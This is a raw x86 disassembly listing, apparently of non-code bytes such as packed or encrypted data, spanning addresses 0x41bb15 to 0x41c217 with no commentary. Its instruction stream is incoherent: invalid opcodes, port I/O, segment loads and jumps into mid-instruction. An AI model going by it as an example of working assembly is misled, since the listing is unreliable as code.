  41bb15:	and    eax,DWORD PTR [esi]
  41bb17:	inc    ecx
  41bb18:	mov    esp,0x8395b250
  41bb1d:	push   0x67
  41bb1f:	test   eax,0x137a839e
  41bb24:	add    eax,0x482d0a9c
  41bb29:	pop    DWORD PTR [esi+0x3fde519c]
  41bb2f:	mov    dl,0x41
  41bb31:	out    dx,eax
  41bb32:	push   0xffffffc8
  41bb34:	and    DWORD PTR [ecx+0x2e7c3ff1],ecx
  41bb3a:	imul   ebp,DWORD PTR [edx+0x338986e7],0x2a63f304
  41bb44:	mov    edi,0x5708af8f
  41bb49:	mov    eax,ds:0xbfd6094d
  41bb4e:	imul   ebp,DWORD PTR [edx],0x51
  41bb51:	popf   
  41bb52:	jl     0x41bb56
  41bb54:	fstp   TBYTE PTR [eax+0x39]
  41bb57:	out    0x3c,eax
  41bb59:	adc    eax,esp
  41bb5b:	sbb    eax,0x78a69a75
  41bb60:	xchg   esp,eax
  41bb61:	add    al,0x5d
  41bb63:	dec    edi
  41bb64:	in     eax,dx
  41bb65:	inc    ecx
  41bb66:	jl     0x41bb44
  41bb68:	aas    
  41bb69:	dec    ebp
  41bb6a:	jle    0x41baef
  41bb6c:	add    al,0xb9
  41bb6e:	mov    edi,DWORD PTR [eax-0x4f]
  41bb71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb72:	cmp    al,BYTE PTR [eax]
  41bb74:	(bad)  
  41bb76:	enter  0xdab4,0xb
  41bb7a:	add    bl,bl
  41bb7c:	in     eax,0xb1
  41bb7e:	add    ah,BYTE PTR [edx+0x53]
  41bb81:	dec    esi
  41bb82:	(bad)  
  41bb83:	loope  0x41bbe1
  41bb85:	jl     0x41bb08
  41bb87:	call   DWORD PTR [ebp-0x13]
  41bb8a:	adc    BYTE PTR [esi+0xe],0xec
  41bb8e:	and    eax,ebp
  41bb90:	arpl   WORD PTR [ebx],sp
  41bb92:	inc    ecx
  41bb93:	ins    DWORD PTR es:[edi],dx
  41bb94:	inc    ecx
  41bb95:	dec    ecx
  41bb96:	sub    DWORD PTR [ebx-0x9],ecx
  41bb99:	sub    BYTE PTR [esi-0x563af2bf],ch
  41bb9f:	sub    al,0x9b
  41bba1:	pushf  
  41bba2:	neg    BYTE PTR [edi-0x100eff49]
  41bba8:	push   ebp
  41bba9:	or     eax,0xd0086d96
  41bbae:	xchg   esp,eax
  41bbaf:	test   al,0x24
  41bbb1:	not    DWORD PTR [ecx-0x33]
  41bbb4:	dec    ebx
  41bbb5:	push   ss
  41bbb6:	ins    BYTE PTR es:[edi],dx
  41bbb7:	pop    edx
  41bbb8:	push   0x9f21b931
  41bbbd:	mov    ah,0xf5
  41bbbf:	adc    eax,0x74d24de8
  41bbc4:	lock push edi
  41bbc6:	outs   dx,BYTE PTR ds:[esi]
  41bbc7:	mov    dl,0x8c
  41bbc9:	xor    al,0xa2
  41bbcb:	rcl    DWORD PTR [esp+esi*4-0x64],0x13
  41bbd0:	cld    
  41bbd1:	xor    al,0x90
  41bbd3:	sub    eax,0x3775d43c
  41bbd8:	lahf   
  41bbd9:	jmp    0x41bb7e
  41bbdb:	xor    bl,BYTE PTR [ecx+0x66]
  41bbde:	mov    ecx,0x86809a
  41bbe3:	cmc    
  41bbe4:	sbb    al,0xc
  41bbe6:	pop    eax
  41bbe7:	jno    0x41bc24
  41bbe9:	cli    
  41bbea:	mov    al,0xe8
  41bbec:	sub    ebx,DWORD PTR [ebx+0x47]
  41bbef:	imul   edi,DWORD PTR [edx+0x4452b75b],0x70
  41bbf6:	mov    al,0x71
  41bbf8:	loope  0x41bc67
  41bbfa:	inc    edx
  41bbfb:	dec    ebp
  41bbfc:	jns    0x41bc11
  41bbfe:	loop   0x41bb90
  41bc00:	dec    edi
  41bc01:	addr16 repz test al,0x87
  41bc05:	xchg   ebx,eax
  41bc06:	sahf   
  41bc07:	dec    ebp
  41bc08:	(bad)  
  41bc09:	out    0xb6,eax
  41bc0b:	mov    edx,0x1814c2ea
  41bc10:	imul   edx,ebp,0xfffffff3
  41bc13:	int    0x97
  41bc15:	outs   dx,BYTE PTR ds:[esi]
  41bc16:	mov    edi,0x92b61b33
  41bc1b:	shl    BYTE PTR [eax-0x5e],1
  41bc1e:	fcomp  st(4)
  41bc20:	pop    ds
  41bc21:	push   edi
  41bc22:	mov    ah,BYTE PTR [edx+0x7f]
  41bc25:	je     0x41bc50
  41bc27:	and    DWORD PTR [edi+edx*8+0x46931b40],0x46363f6b
  41bc32:	jbe    0x41bc05
  41bc34:	push   0xcfb12a9c
  41bc39:	je     0x41bc1d
  41bc3b:	mov    al,0x71
  41bc3d:	cld    
  41bc3e:	aad    0x95
  41bc40:	ret    0x26c0
  41bc43:	sti    
  41bc44:	mov    ah,0xcb
  41bc46:	pop    es
  41bc47:	or     eax,0xe1df9ca0
  41bc4c:	jecxz  0x41bc28
  41bc4e:	ja     0x41bc62
  41bc50:	popf   
  41bc51:	add    BYTE PTR [edx],bl
  41bc53:	push   esi
  41bc54:	addr16 push esi
  41bc56:	pop    edi
  41bc57:	stos   DWORD PTR es:[edi],eax
  41bc58:	jg     0x41bc3b
  41bc5a:	lods   al,BYTE PTR ds:[esi]
  41bc5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc5c:	add    eax,esi
  41bc5e:	cmp    BYTE PTR [ebx+ecx*8-0x52f67875],al
  41bc65:	idiv   DWORD PTR [edx]
  41bc67:	sbb    DWORD PTR [esi-0x3a],ebx
  41bc6a:	lods   eax,DWORD PTR ds:[esi]
  41bc6b:	mov    esp,esi
  41bc6d:	inc    esp
  41bc6e:	fdivr  st(4),st
  41bc70:	push   cs
  41bc71:	push   esp
  41bc72:	push   es
  41bc73:	cmp    eax,0xc1dac82c
  41bc78:	aaa    
  41bc79:	mov    bh,0x4a
  41bc7b:	lods   eax,DWORD PTR ds:[esi]
  41bc7c:	dec    esi
  41bc7d:	loop   0x41bc5e
  41bc7f:	inc    ebx
  41bc80:	jne    0x41bcbc
  41bc82:	fmul   DWORD PTR [esi]
  41bc84:	retf   0x8b5f
  41bc87:	(bad)  
  41bc89:	adc    ebx,DWORD PTR [esi-0x72]
  41bc8c:	pop    ds
  41bc8d:	lahf   
  41bc8e:	push   ebx
  41bc8f:	mov    eax,ds:0x1cc96931
  41bc94:	test   eax,0x675d69b1
  41bc99:	cmp    BYTE PTR [ecx+0x48],bl
  41bc9c:	or     dh,BYTE PTR [ebp+ecx*2+0x588f3e17]
  41bca3:	out    0xd0,eax
  41bca5:	popa   
  41bca6:	out    0x27,eax
  41bca8:	ins    BYTE PTR es:[edi],dx
  41bca9:	xor    eax,DWORD PTR [edx+0x7c]
  41bcac:	mov    al,0x47
  41bcae:	arpl   WORD PTR [eax-0x73],si
  41bcb1:	push   ecx
  41bcb2:	fsub   QWORD PTR [eax]
  41bcb4:	mov    ebx,0x9ce84ce7
  41bcb9:	xchg   esp,eax
  41bcba:	pop    ds
  41bcbb:	push   eax
  41bcbc:	in     eax,dx
  41bcbd:	popf   
  41bcbe:	out    0xbc,al
  41bcc0:	aam    0x1
  41bcc2:	mov    bl,BYTE PTR [ebx-0x43]
  41bcc5:	out    dx,al
  41bcc6:	aas    
  41bcc7:	pop    ebx
  41bcc8:	mov    ah,0xd5
  41bcca:	push   edx
  41bccb:	pop    ebp
  41bccc:	push   edx
  41bccd:	rol    DWORD PTR [ecx],cl
  41bccf:	lds    ebp,FWORD PTR [ebp-0x17]
  41bcd2:	or     BYTE PTR [ebp-0x5d],cl
  41bcd5:	popf   
  41bcd6:	(bad)  
  41bcd7:	xchg   ecx,eax
  41bcd8:	xchg   DWORD PTR [edx-0x34],ecx
  41bcdb:	or     ch,BYTE PTR [edi+0x4a]
  41bcde:	(bad)  
  41bcdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bce0:	hlt    
  41bce1:	popf   
  41bce2:	fisubr DWORD PTR [eax+0x54231613]
  41bce8:	xchg   BYTE PTR [esi],cl
  41bcea:	out    0x7d,al
  41bcec:	scas   eax,DWORD PTR es:[edi]
  41bced:	hlt    
  41bcee:	jae    0x41bd19
  41bcf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcf1:	xchg   esi,eax
  41bcf2:	ret    0x57ba
  41bcf5:	scas   eax,DWORD PTR es:[edi]
  41bcf6:	dec    ecx
  41bcf7:	stos   DWORD PTR es:[edi],eax
  41bcf8:	pop    ds
  41bcf9:	in     eax,dx
  41bcfa:	cmp    ebx,esi
  41bcfc:	mov    eax,0xc0780fea
  41bd01:	test   al,0xcb
  41bd03:	lds    edi,FWORD PTR [edi-0x5a]
  41bd06:	dec    ecx
  41bd07:	mov    esp,0x32999497
  41bd0c:	sbb    eax,0x84aab52e
  41bd11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd12:	pop    ebp
  41bd13:	or     eax,0xe248a62b
  41bd18:	(bad)  
  41bd1a:	mov    dh,0x5d
  41bd1c:	stos   BYTE PTR es:[edi],al
  41bd1d:	(bad)  
  41bd1e:	jo     0x41bd9e
  41bd20:	(bad)  
  41bd21:	arpl   WORD PTR [edi],ax
  41bd23:	loop   0x41bd41
  41bd25:	add    dl,BYTE PTR [edx+ebx*1]
  41bd28:	mov    ecx,0x931c8b50
  41bd2d:	stos   BYTE PTR es:[edi],al
  41bd2e:	cdq    
  41bd2f:	mov    al,ds:0x851f3b09
  41bd34:	cmc    
  41bd35:	inc    esp
  41bd36:	(bad)  
  41bd37:	dec    ebx
  41bd38:	push   es
  41bd39:	sub    eax,0x2089485b
  41bd3e:	xor    eax,DWORD PTR [eax-0x11d88f0f]
  41bd44:	jle    0x41bcf9
  41bd46:	cmp    BYTE PTR [esi+0x5b],cl
  41bd49:	in     al,0x47
  41bd4b:	and    al,0xf7
  41bd4d:	dec    esp
  41bd4e:	aaa    
  41bd4f:	jns    0x41bd1a
  41bd51:	sbb    DWORD PTR [ebx-0x3b63d620],0xcb5ee724
  41bd5b:	and    dl,BYTE PTR [eax-0x42bea149]
  41bd61:	jo     0x41bd6c
  41bd63:	mov    edx,0x8d8066bc
  41bd68:	ins    BYTE PTR es:[edi],dx
  41bd69:	leave  
  41bd6a:	inc    ebp
  41bd6b:	std    
  41bd6c:	adc    BYTE PTR [edx],al
  41bd6e:	jp     0x41bd22
  41bd70:	(bad)  
  41bd71:	push   es
  41bd72:	jbe    0x41bd4a
  41bd74:	and    eax,0xe4251d0
  41bd79:	in     eax,0x7
  41bd7b:	mov    WORD PTR [edx],?
  41bd7d:	out    0xad,al
  41bd7f:	int    0xba
  41bd81:	lock sub eax,0x4a70a7aa
  41bd87:	push   ebp
  41bd88:	add    eax,0x16541ae7
  41bd8d:	and    eax,0x830f108e
  41bd92:	push   ds
  41bd93:	cs inc esp
  41bd95:	sub    cl,dl
  41bd97:	push   eax
  41bd98:	lods   al,BYTE PTR ds:[esi]
  41bd99:	xchg   edx,eax
  41bd9a:	(bad)  
  41bd9b:	xchg   esi,eax
  41bd9c:	pusha  
  41bd9d:	imul   ebp,DWORD PTR [eax],0x26
  41bda0:	inc    ebp
  41bda1:	out    dx,al
  41bda2:	cmc    
  41bda3:	inc    ebp
  41bda4:	sbb    eax,DWORD PTR [ebx+edi*8+0x1a]
  41bda8:	sub    DWORD PTR [edx-0x2219c00d],edx
  41bdae:	adc    al,0x7f
  41bdb0:	shr    BYTE PTR [ebp+0x3a],0xec
  41bdb4:	frstor [edx+0x4c50cc0d]
  41bdba:	cli    
  41bdbb:	popf   
  41bdbc:	mov    edx,0x364cfe78
  41bdc1:	add    dh,BYTE PTR [esi-0x1bc11b90]
  41bdc7:	xor    BYTE PTR cs:[eax-0x60ea1946],bl
  41bdce:	mov    al,ds:0xc2b7ee22
  41bdd3:	sub    ebp,edx
  41bdd5:	hlt    
  41bdd6:	push   0x4a
  41bdd8:	aas    
  41bdd9:	rol    BYTE PTR [ebx],1
  41bddb:	sub    ch,BYTE PTR [eax]
  41bddd:	enter  0xf3e5,0x9f
  41bde1:	push   esp
  41bde2:	cs leave 
  41bde4:	xor    eax,0x5632ba6
  41bde9:	in     eax,0x39
  41bdeb:	dec    ecx
  41bdec:	pop    edi
  41bded:	out    0x16,eax
  41bdef:	fldenv [eax-0x6ba19a0b]
  41bdf5:	dec    ebx
  41bdf6:	or     DWORD PTR [edi+0x71],0xffffffdd
  41bdfa:	cwde   
  41bdfb:	inc    BYTE PTR [ecx]
  41bdfd:	sub    BYTE PTR [eax+edi*8],ah
  41be00:	push   ecx
  41be01:	mov    ebp,0xf671f178
  41be06:	inc    edi
  41be07:	xlat   BYTE PTR ds:[ebx]
  41be08:	and    al,BYTE PTR [ebx+edi*1+0x225438ab]
  41be0f:	(bad)  
  41be10:	adc    esi,DWORD PTR [ebx+0xe]
  41be13:	adc    eax,0x1e27e46c
  41be18:	inc    esi
  41be19:	int3   
  41be1a:	adc    DWORD PTR ds:0x96c0735d,esi
  41be20:	test   DWORD PTR [esi],ecx
  41be22:	pop    es
  41be23:	mov    eax,0x7b0e9278
  41be28:	jo     0x41bea0
  41be2a:	ja     0x41bdd0
  41be2c:	pushf  
  41be2d:	add    esp,DWORD PTR [eax-0x6b]
  41be30:	addr16 xchg ebp,eax
  41be32:	mov    cl,0xfc
  41be34:	lods   al,BYTE PTR ds:[esi]
  41be35:	outs   dx,DWORD PTR ds:[esi]
  41be36:	mov    WORD PTR [edx],es
  41be38:	sbb    al,0xd8
  41be3a:	pop    esi
  41be3b:	xor    eax,0xde8eb5e2
  41be40:	pop    edx
  41be41:	sbb    dh,al
  41be43:	mov    al,0x8f
  41be45:	test   al,0x5
  41be47:	add    eax,0xcc6904c0
  41be4c:	add    BYTE PTR [edx],ch
  41be4e:	sub    ch,BYTE PTR [edi+0x1bb044fb]
  41be54:	popa   
  41be55:	fbstp  TBYTE PTR [eax]
  41be57:	add    DWORD PTR [eax-0x4e7cb624],esp
  41be5d:	popf   
  41be5e:	popa   
  41be5f:	add    ch,dl
  41be61:	xchg   esp,eax
  41be62:	mov    ch,0x79
  41be64:	mov    esp,0x37580942
  41be69:	mov    esi,0x19362dc8
  41be6e:	cld    
  41be6f:	dec    edi
  41be70:	out    dx,al
  41be71:	ror    ebx,1
  41be73:	pop    ebp
  41be74:	add    edx,0x77
  41be77:	jmp    0x41beaa
  41be79:	mov    bh,BYTE PTR [edi]
  41be7b:	mov    ch,0x36
  41be7d:	(bad)  
  41be7e:	push   ss
  41be7f:	adc    edx,edi
  41be81:	mov    bh,0xd1
  41be83:	mov    ah,BYTE PTR [esi]
  41be85:	jnp    0x41be10
  41be87:	test   bh,dh
  41be89:	xchg   esp,eax
  41be8a:	repz add BYTE PTR [ebx+0xc],0x15
  41be8f:	mov    al,ds:0x450a4aa7
  41be94:	jecxz  0x41be57
  41be96:	into   
  41be97:	gs aam 0x58
  41be9a:	sub    DWORD PTR [ebp+edi*8+0x2d4a5ec1],ecx
  41bea1:	mov    ch,0xdb
  41bea3:	popf   
  41bea4:	int3   
  41bea5:	sub    ch,BYTE PTR [ecx]
  41bea7:	lods   eax,DWORD PTR ds:[esi]
  41bea8:	ins    BYTE PTR es:[edi],dx
  41bea9:	imul   edi,DWORD PTR [ebp+0x686caae8],0x744bc1d0
  41beb3:	loope  0x41bf2c
  41beb5:	(bad)  
  41beb7:	dec    eax
  41beb8:	sub    BYTE PTR [eax-0x2bf7b1fb],bl
  41bebe:	leave  
  41bebf:	stos   BYTE PTR es:[edi],al
  41bec0:	ror    DWORD PTR [esi],cl
  41bec2:	xchg   DWORD PTR [ecx+0x4e],esp
  41bec5:	cmp    DWORD PTR [ecx],edx
  41bec7:	mov    dh,0x95
  41bec9:	ja     0x41bf10
  41becb:	loope  0x41becd
  41becd:	mov    cl,0x3
  41becf:	cdq    
  41bed0:	test   BYTE PTR [esi+0x3f5f7867],ch
  41bed6:	lea    edx,[edi]
  41bed8:	pop    es
  41bed9:	cmc    
  41beda:	xchg   ebx,eax
  41bedb:	aad    0x8e
  41bedd:	outs   dx,DWORD PTR ds:[esi]
  41bede:	call   FWORD PTR [edi-0xead0b0f]
  41bee4:	outs   dx,DWORD PTR ds:[esi]
  41bee5:	inc    ebp
  41bee6:	sub    dh,ch
  41bee8:	xlat   BYTE PTR ds:[ebx]
  41bee9:	pop    esi
  41beea:	lods   al,BYTE PTR ds:[esi]
  41beeb:	jle    0x41bec6
  41beed:	jl     0x41bedd
  41beef:	cmp    edi,DWORD PTR [edi-0x5d]
  41bef2:	shr    BYTE PTR [esi+0x7d],0x86
  41bef6:	jne    0x41beae
  41bef8:	pop    ebx
  41bef9:	ja     0x41bf46
  41befb:	lods   eax,DWORD PTR ds:[esi]
  41befc:	mov    ds:0x395d01d4,al
  41bf01:	cmp    DWORD PTR [edx-0x58],esi
  41bf04:	(bad)  
  41bf05:	lods   al,BYTE PTR ds:[esi]
  41bf06:	les    ebx,FWORD PTR [eax]
  41bf08:	popf   
  41bf09:	stos   DWORD PTR es:[edi],eax
  41bf0a:	mov    eax,0x4a5a3905
  41bf0f:	cs fs and al,0x46
  41bf13:	push   es
  41bf14:	add    al,0x22
  41bf16:	call   0x9ccec2ee
  41bf1b:	ja     0x41bf93
  41bf1d:	push   cs
  41bf1e:	add    eax,0xa31f4039
  41bf23:	mov    ebx,0x65c22a1d
  41bf28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf29:	or     esp,DWORD PTR [ecx+0x18cc673a]
  41bf2f:	nop
  41bf30:	push   esp
  41bf31:	not    BYTE PTR [edi-0x15]
  41bf34:	cdq    
  41bf35:	clc    
  41bf36:	sahf   
  41bf37:	adc    BYTE PTR [ecx],0x58
  41bf3a:	or     ah,BYTE PTR [ecx+0x6cebd5b0]
  41bf40:	nop
  41bf41:	(bad)  
  41bf42:	dec    esi
  41bf43:	and    eax,0xf0780ba2
  41bf48:	and    BYTE PTR [edx-0x6d],cl
  41bf4b:	xor    eax,0x1199f8c3
  41bf50:	xchg   edx,eax
  41bf51:	mov    dh,0x7b
  41bf53:	inc    ecx
  41bf54:	mov    bl,BYTE PTR [eax]
  41bf56:	adc    bl,ch
  41bf58:	mov    edi,DWORD PTR [ebx+0xaa59131]
  41bf5e:	scas   al,BYTE PTR es:[edi]
  41bf5f:	(bad)  
  41bf60:	adc    ah,cl
  41bf62:	imul   eax,DWORD PTR [ebx-0x73],0xfc689c10
  41bf69:	ins    DWORD PTR es:[edi],dx
  41bf6a:	mov    ?,WORD PTR [ecx+0x7f]
  41bf6d:	mov    dh,0xf0
  41bf6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf70:	cmp    ebx,DWORD PTR [edi+eax*4]
  41bf73:	push   es
  41bf74:	(bad)  
  41bf75:	dec    edx
  41bf76:	call   0xfc59609b
  41bf7b:	sbb    al,0x12
  41bf7d:	push   cs
  41bf7e:	into   
  41bf7f:	ror    DWORD PTR [esi+0x58],1
  41bf82:	scas   al,BYTE PTR es:[edi]
  41bf83:	fcmove st,st(4)
  41bf85:	cmp    al,0x98
  41bf87:	lods   al,BYTE PTR ds:[esi]
  41bf88:	push   edx
  41bf89:	inc    esp
  41bf8a:	jno    0x41bfab
  41bf8c:	cmp    eax,0xb0cb7f20
  41bf91:	ins    DWORD PTR es:[edi],dx
  41bf92:	pusha  
  41bf93:	mov    DWORD PTR [edi],eax
  41bf95:	fcmovu st,st(5)
  41bf97:	test   BYTE PTR [edx+eiz*1-0xfdefe4f],ch
  41bf9e:	out    0x21,eax
  41bfa0:	sbb    al,0xba
  41bfa2:	dec    esp
  41bfa3:	test   eax,0xcbe98763
  41bfa8:	add    ecx,DWORD PTR [edi+0x110107a9]
  41bfae:	cwde   
  41bfaf:	mov    ebp,0x301fdca7
  41bfb4:	icebp  
  41bfb5:	(bad)  
  41bfb6:	pop    ds
  41bfb7:	push   eax
  41bfb8:	nop
  41bfb9:	push   ss
  41bfba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfbb:	sub    ah,BYTE PTR [eax-0x3f5b9add]
  41bfc1:	add    bh,BYTE PTR [eax+0x52c1c194]
  41bfc7:	or     BYTE PTR [ebx+0x56b8a4a9],ah
  41bfcd:	mov    bh,0x6a
  41bfcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfd0:	dec    esp
  41bfd1:	mov    BYTE PTR [edi+0x30],ah
  41bfd4:	stos   BYTE PTR es:[edi],al
  41bfd5:	stc    
  41bfd6:	scas   eax,DWORD PTR es:[edi]
  41bfd7:	xor    bl,cl
  41bfd9:	xchg   ebx,eax
  41bfda:	xchg   esi,eax
  41bfdb:	mov    cl,0x3
  41bfdd:	dec    esp
  41bfde:	pop    DWORD PTR [eax-0x13cff00d]
  41bfe4:	add    eax,DWORD PTR [ecx+0x73d9f0c]
  41bfea:	cld    
  41bfeb:	mov    bh,BYTE PTR [ebx]
  41bfed:	enter  0x116b,0x19
  41bff1:	out    dx,eax
  41bff2:	inc    eax
  41bff3:	push   esp
  41bff4:	rol    esi,1
  41bff6:	(bad)  
  41bff7:	in     eax,0xe8
  41bff9:	outs   dx,DWORD PTR ds:[esi]
  41bffa:	push   eax
  41bffb:	jbe    0x41bf81
  41bffd:	push   edi
  41bffe:	shl    DWORD PTR [edi-0x7d],0xce
  41c002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c003:	and    ebp,DWORD PTR [ebx]
  41c005:	call   0xcf0f46b9
  41c00a:	in     al,dx
  41c00b:	call   0x4daa248a
  41c010:	dec    edi
  41c011:	fdiv   DWORD PTR [edx]
  41c013:	adc    ch,BYTE PTR [edx-0x7c0a3e54]
  41c019:	paddsw mm6,QWORD PTR [edx+0xd1f9688]
  41c020:	mov    al,ds:0x2303be3d
  41c025:	jg     0x41c072
  41c027:	sub    eax,0xdc4f68b
  41c02c:	push   eax
  41c02d:	int3   
  41c02e:	pop    ebx
  41c02f:	in     al,dx
  41c030:	fcomi  st,st(6)
  41c032:	in     al,dx
  41c033:	sar    ecx,0x7
  41c036:	add    al,0xfd
  41c038:	dec    edx
  41c039:	sti    
  41c03a:	retf   0xb425
  41c03d:	or     DWORD PTR [edi+0x15ef1a21],ebx
  41c043:	mov    ds:0xf0cf11e0,al
  41c048:	xchg   ecx,eax
  41c049:	test   BYTE PTR [edx-0x58],bl
  41c04c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c04d:	mov    eax,ds:0x350ae2d7
  41c052:	pop    ebp
  41c053:	retf   0x76b9
  41c056:	inc    esp
  41c057:	cli    
  41c058:	idiv   esi
  41c05a:	xchg   edx,eax
  41c05b:	push   0x83cf2ed4
  41c060:	xor    al,0x7d
  41c062:	les    edx,FWORD PTR [ecx+0x47c40e0d]
  41c068:	jb     0x41c020
  41c06a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c06b:	xlat   BYTE PTR ds:[ebx]
  41c06c:	pop    eax
  41c06d:	lods   eax,DWORD PTR ds:[esi]
  41c06e:	xchg   cx,ax
  41c070:	pop    ebp
  41c071:	mov    ebp,0xc0516329
  41c076:	pusha  
  41c077:	pop    ebx
  41c078:	jbe    0x41c042
  41c07a:	or     eax,0xae52c479
  41c07f:	repnz leave 
  41c081:	aas    
  41c082:	xor    eax,0xd563162d
  41c087:	inc    ebx
  41c088:	jg     0x41c048
  41c08a:	push   ss
  41c08b:	lds    ebx,FWORD PTR [edi+ebp*1+0x413decb2]
  41c092:	out    dx,eax
  41c093:	cmp    edi,edi
  41c095:	sbb    ebp,DWORD PTR [ebx+edx*2-0x581b48ba]
  41c09c:	add    eax,0x1d57c977
  41c0a1:	dec    ebx
  41c0a2:	xor    DWORD PTR [edi+eax*8-0x58a6d25c],ecx
  41c0a9:	pop    es
  41c0aa:	popf   
  41c0ab:	jge    0x41c121
  41c0ad:	push   ebx
  41c0ae:	fimul  DWORD PTR [edi-0x5baaaa63]
  41c0b4:	mov    bl,0x31
  41c0b6:	jg     0x41c06e
  41c0b8:	aam    0x40
  41c0ba:	xchg   esp,eax
  41c0bb:	push   ebx
  41c0bc:	mov    cl,0x77
  41c0be:	fadd   QWORD PTR [ebx-0x2ed06e39]
  41c0c4:	dec    ebx
  41c0c5:	cmp    edi,ebx
  41c0c7:	pop    ebx
  41c0c8:	fstp   TBYTE PTR [esi]
  41c0ca:	leave  
  41c0cb:	aas    
  41c0cc:	cld    
  41c0cd:	bound  esi,QWORD PTR gs:[esi-0x50]
  41c0d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0d2:	jmp    0xefb7f034
  41c0d7:	cmp    bl,BYTE PTR [ebp-0x54]
  41c0da:	xor    edi,DWORD PTR [edx+0x5952a68c]
  41c0e0:	(bad)  
  41c0e1:	jae    0x41c152
  41c0e3:	cmp    BYTE PTR [edx-0xfe691b0],dl
  41c0e9:	pop    ss
  41c0ea:	or     cl,BYTE PTR [eax+edi*2]
  41c0ed:	inc    edi
  41c0ee:	enter  0x925b,0xbf
  41c0f2:	and    DWORD PTR [edx],esi
  41c0f4:	mov    dl,0xfe
  41c0f6:	shr    DWORD PTR [edi-0x51],cl
  41c0f9:	sub    ebx,DWORD PTR [edx-0x17b6c88b]
  41c0ff:	push   esi
  41c100:	dec    ecx
  41c101:	js     0x41c174
  41c103:	scas   al,BYTE PTR es:[edi]
  41c104:	inc    eax
  41c105:	arpl   WORD PTR [edi+0x62],cx
  41c108:	addr16 sbb eax,eax
  41c10b:	cmp    eax,0x1745e263
  41c110:	(bad)  
  41c112:	add    BYTE PTR [ecx+0x57cedbe5],cl
  41c118:	mov    bl,0xaa
  41c11a:	mov    eax,0xf4905ad0
  41c11f:	jle    0x41c0b9
  41c121:	pop    esi
  41c122:	int3   
  41c123:	fucomi st,st(6)
  41c125:	das    
  41c126:	loope  0x41c0f8
  41c128:	call   0xa34170b2
  41c12d:	sbb    edx,DWORD PTR [edx]
  41c12f:	pop    ds
  41c130:	test   al,0x8c
  41c132:	add    al,ch
  41c134:	jl     0x41c13d
  41c136:	cmp    esp,DWORD PTR [ebx-0x5f]
  41c139:	adc    ecx,DWORD PTR cs:[edx]
  41c13c:	push   ss
  41c13d:	mov    esi,DWORD PTR [ebx+0x2d]
  41c140:	mov    esp,DWORD PTR [esi+0x6ec90d55]
  41c146:	jg     0x41c0f8
  41c148:	cmp    al,dl
  41c14a:	lock ins BYTE PTR es:[edi],dx
  41c14c:	aaa    
  41c14d:	lea    ebx,[edi-0xc]
  41c150:	mov    WORD PTR [ebx+0x5b],?
  41c153:	adc    dh,BYTE PTR [ebx]
  41c155:	or     al,0xea
  41c157:	jecxz  0x41c0e3
  41c159:	xor    eax,0x36fd772b
  41c15e:	je     0x41c152
  41c160:	inc    ecx
  41c161:	in     eax,0xeb
  41c163:	lods   eax,DWORD PTR ds:[esi]
  41c164:	add    eax,0xcd92b42c
  41c169:	mov    dl,0xe6
  41c16b:	jns    0x41c167
  41c16d:	mov    ecx,0xd1d2d977
  41c172:	push   eax
  41c173:	pop    ss
  41c174:	scas   al,BYTE PTR es:[edi]
  41c175:	ret    
  41c176:	loope  0x41c171
  41c178:	push   ebx
  41c179:	je     0x41c110
  41c17b:	adc    DWORD PTR [esi],esp
  41c17d:	ins    DWORD PTR es:[edi],dx
  41c17e:	inc    eax
  41c17f:	js     0x41c1cc
  41c181:	add    BYTE PTR ds:0x77d4b16f,0xa1
  41c188:	loopne 0x41c12a
  41c18a:	xchg   ah,bl
  41c18c:	rcl    BYTE PTR [ecx-0x2ee05ab8],1
  41c192:	push   eax
  41c193:	scas   eax,DWORD PTR es:[edi]
  41c194:	cmp    esp,DWORD PTR [ecx-0x7a]
  41c197:	or     al,0x6d
  41c199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c19a:	mov    cl,0xf6
  41c19c:	ds push esp
  41c19e:	push   ds
  41c19f:	cmc    
  41c1a0:	xchg   esp,eax
  41c1a1:	add    BYTE PTR ds:0xa69856ba,dh
  41c1a7:	jns    0x41c174
  41c1a9:	mov    bl,0x8e
  41c1ab:	dec    ecx
  41c1ac:	mov    ebp,0xdc6a2dfd
  41c1b1:	inc    esp
  41c1b2:	stos   BYTE PTR es:[edi],al
  41c1b3:	jns    0x41c13f
  41c1b5:	cld    
  41c1b6:	and    al,0xf4
  41c1b8:	mov    ch,0x6f
  41c1ba:	and    DWORD PTR [edx+0x2314f32d],ecx
  41c1c0:	push   0x9d85fcd0
  41c1c5:	mov    al,fs:0xee9a8813
  41c1cb:	aam    0xe8
  41c1cd:	adc    BYTE PTR [ecx+0x7],bh
  41c1d0:	in     eax,dx
  41c1d1:	cmc    
  41c1d2:	shl    BYTE PTR [ebp+0x471df9f2],cl
  41c1d8:	add    al,bh
  41c1da:	das    
  41c1db:	out    0x2b,eax
  41c1dd:	sbb    bp,sp
  41c1e0:	std    
  41c1e1:	arpl   si,ax
  41c1e3:	push   esp
  41c1e4:	mov    ebp,0x3dbbe9b2
  41c1e9:	and    eax,0x8af591d
  41c1ee:	dec    esi
  41c1ef:	(bad)  
  41c1f0:	(bad)  
  41c1f1:	xlat   BYTE PTR ds:[ebx]
  41c1f2:	push   ds
  41c1f3:	(bad)  [esi-0x6da280a3]
  41c1f9:	push   ecx
  41c1fa:	pop    esi
  41c1fb:	inc    esi
  41c1fc:	retf   0x9dbc
  41c1ff:	in     eax,0x97
  41c201:	out    0xd1,eax
  41c203:	mov    cs,ebx
  41c205:	fdiv   QWORD PTR [eax-0x182534cd]
  41c20b:	cwde   
  41c20c:	call   FWORD PTR [eax]
  41c20e:	push   ds
  41c20f:	outs   dx,BYTE PTR ds:[esi]
  41c210:	jle    0x41c207
  41c212:	mov    ds:0x68d30a20,al
  41c217:	jle    0x41c27d
